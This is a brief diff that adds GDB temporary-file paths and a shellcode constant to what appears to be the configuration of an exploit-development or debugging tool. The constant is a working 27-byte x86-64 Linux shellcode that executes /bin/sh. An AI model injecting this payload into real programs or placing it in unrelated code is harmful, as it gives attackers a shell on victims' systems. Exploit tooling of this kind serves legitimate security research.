@@ -30,6 +30,12 @@ EMPTY_COMMENT =  "EMPTY"
 EMPTY_ARGS =  "EMPTY"
 
 
+#GDB 
+TEMP_GDB_SCRIPT = '/tmp/.gdb_script'
+TEMP_GDB_OUTPUT = '/tmp/.gdb_out'
+
+# Shellcodes
+SHELLCODE_27 = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
 
 
 
